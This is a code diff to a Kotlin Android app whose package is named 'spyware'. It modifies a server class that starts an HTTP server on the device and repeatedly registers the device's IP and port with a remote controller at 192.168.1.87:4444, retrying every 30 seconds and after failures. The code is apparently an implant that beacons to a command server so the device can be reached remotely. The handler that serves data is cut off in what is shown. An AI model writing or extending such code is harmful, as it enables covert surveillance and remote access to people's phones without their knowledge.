@@ -1,4 +1,4 @@
-package com.lautaro.spyware;
+package com.lautaro.spyware
 
 import android.app.Activity
 import android.app.Application
@@ -6,6 +6,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Bundle
 import android.util.Log
+import android.net.ConnectivityManager
 import fi.iki.elonen.NanoHTTPD
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -20,6 +21,7 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Response as OkHttpResponse
 import org.json.JSONObject
 import java.io.File
 import java.io.FileInputStream
@@ -31,7 +33,11 @@ class Server(   private val dataRepository: DataRepository,
                 private val context: Context
 ): NanoHTTPD(1234) {
 
-    private val client: OkHttpClient = OkHttpClient()
+    private var client: OkHttpClient = OkHttpClient.Builder()
+        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+        .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+        .writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+        .build()
     private val coroutineScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
 
     @Volatile
@@ -66,11 +72,22 @@ class Server(   private val dataRepository: DataRepository,
 
     init {
         try {
-            // notifyFlaskServer()
+            start() // Start the NanoHTTPD server
             (context.applicationContext as Application).registerActivityLifecycleCallbacks(lifecycleCallback)
-            Log.d("SimpleHttpServer", "HTTP Server started on port 7777")
+            Log.d("SimpleHttpServer", "HTTP Server started on port 1234")
+            
+            // Check network connectivity
+            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            val networkInfo = connectivityManager.activeNetworkInfo
+            if (networkInfo != null && networkInfo.isConnected) {
+                Log.d("SimpleHttpServer", "Network is available, registering with server")
+                notifyFlaskServer() // Register immediately on start
+            } else {
+                Log.e("SimpleHttpServer", "No network connectivity available")
+            }
+            
             startPolling()
-        } catch (e: okio.IOException) {
+        } catch (e: Exception) {
             Log.e("SimpleHttpServer", "Failed to start HTTP Server: ${e.message}")
         }
     }
@@ -80,52 +97,114 @@ class Server(   private val dataRepository: DataRepository,
             try {
                 while (isActive) {
                     notifyFlaskServer()
-                    delay(60 * 5000L) // 5 minutes delay
+                    Log.d("SimpleHttpServer", "Sent registration to server at 192.168.1.87")
+                    delay(30 * 1000L) // 30 seconds delay for more frequent registration attempts
                 }
-            } catch (_: Exception) {
-
+            } catch (e: Exception) {
+                Log.e("SimpleHttpServer", "Error in polling: ${e.message}")
             }
         }
     }
 
     private fun notifyFlaskServer() {
-        val ip = getLocalIpAddress()
-        val url = "http://192.168.1.97:4444/register"
-        val payload = JSONObject().apply {
-            put("ip", ip)
-            put("port", "1234")
+        try {
+            val ipAddress = getLocalIpAddress()
+            Log.d("SimpleHttpServer", "Attempting to register device with IP: $ipAddress to server at 192.168.1.87:4444")
+            
+            // Only include 'ip' and 'port' as required by Flask server
+            val payload = JSONObject().apply {
+                put("ip", ipAddress)
+                put("port", 1234)
+            }
+            
+            Log.d("SimpleHttpServer", "Registration payload: ${payload}")
+            
+            val url = "http://192.168.1.87:4444/register"
+            val request = Request.Builder()
+                .url(url)
+                .post(payload.toString().toRequestBody("application/json".toMediaType()))
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: okhttp3.Call, e: IOException) {
+                    Log.e("SimpleHttpServer", "Registration network error: ${e.message}")
+                    // Try to get more info about network status
+                    val currentIp = getLocalIpAddress()
+                    Log.e("SimpleHttpServer", "Registration attempt failed: IP=$currentIp, Target=192.168.1.87:4444, Error=${e.javaClass.simpleName}")
+                }
+
+                override fun onResponse(call: okhttp3.Call, response: OkHttpResponse) {
+                    val responseBody = response.body?.string() ?: ""
+                    Log.d("SimpleHttpServer", "Registration response code: ${response.code}, body: $responseBody")
+                    
+                    if (response.isSuccessful) {
+                        Log.d("SimpleHttpServer", "Device successfully registered with server")
+                        // Store successful registration time
+                        try {
+                            val prefs = context.getSharedPreferences("server_prefs", Context.MODE_PRIVATE)
+                            prefs.edit().putLong("last_successful_registration", System.currentTimeMillis()).apply()
+                        } catch (e: Exception) {
+                            Log.e("SimpleHttpServer", "Failed to save registration status: ${e.message}")
+                        }
+                    } else {
+                        Log.e("SimpleHttpServer", "Failed to register device, HTTP error: ${response.code}, message: $responseBody")
+                        // Try to re-register sooner on failure
+                        coroutineScope.launch {
+                            delay(5000) // Wait 5 seconds and try again
+                            notifyFlaskServer()
+                        }
+                    }
+                    response.close() // Always close the response
+                }
+            })
+        } catch (e: Exception) {
+            Log.e("SimpleHttpServer", "Exception in notifyFlaskServer: ${e.message}")
         }
-
-        val request = Request.Builder()
-            .url(url)
-            .post(payload.toString().toRequestBody("application/json".toMediaType()))
-            .build()
-
-        client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: okhttp3.Call, e: IOException) {
-                Log.e("SimpleHttpServer", "Notification failed: ${e.message}")
-            }
-
-            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
-                Log.d("SimpleHttpServer", "Notification response code: ${response.code}")
-                response.close() // Always close the response
-            }
-        })
     }
 
     private fun getLocalIpAddress(): String? {
-        val interfaces = NetworkInterface.getNetworkInterfaces()
-        while (interfaces.hasMoreElements()) {
-            val networkInterface = interfaces.nextElement()
-            val addresses = networkInterface.inetAddresses
-            while (addresses.hasMoreElements()) {
-                val address = addresses.nextElement()
-                if (!address.isLoopbackAddress && address is Inet4Address) {
-                    return address.hostAddress
+        try {
+            // Log all available network interfaces for debugging
+            val allAddresses = mutableListOf<String>()
+            val interfaces = NetworkInterface.getNetworkInterfaces()
+            
+            while (interfaces.hasMoreElements()) {
+                val networkInterface = interfaces.nextElement()
+                // Skip loopback and disabled interfaces
+                if (networkInterface.isLoopback || !networkInterface.isUp) {
+                    continue
+                }
+                
+                val addresses = networkInterface.inetAddresses
+                while (addresses.hasMoreElements()) {
+                    val address = addresses.nextElement()
+                    if (!address.isLoopbackAddress && address is Inet4Address) {
+                        val hostAddress = address.hostAddress
+                        allAddresses.add("${networkInterface.displayName}: $hostAddress")
+                        // Prefer non-localhost addresses
+                        if (!hostAddress.startsWith("127.")) {
+                            Log.d("SimpleHttpServer", "Using IP address: $hostAddress from interface: ${networkInterface.displayName}")
+                            return hostAddress
+                        }
+                    }
                 }
             }
+            
+            // Log all discovered addresses for debugging
+            Log.d("SimpleHttpServer", "All available interfaces: ${allAddresses.joinToString(", ")}")
+            
+            if (allAddresses.isEmpty()) {
+                Log.w("SimpleHttpServer", "No network interfaces found, using localhost")
+                return "127.0.0.1"
+            } else {
+                // If we didn't return earlier, use the first address found
+                val parts = allAddresses.first().split(": ")
+                return if (parts.size > 1) parts[1] else "127.0.0.1"
+            }
+        } catch (e: Exception) {
+            Log.e("SimpleHttpServer", "Error getting IP address: ${e.message}")
+            return "127.0.0.1"
         }
-        return "127.0.0.1"
     }
 
     override fun serve(session: IHTTPSession?): Response {
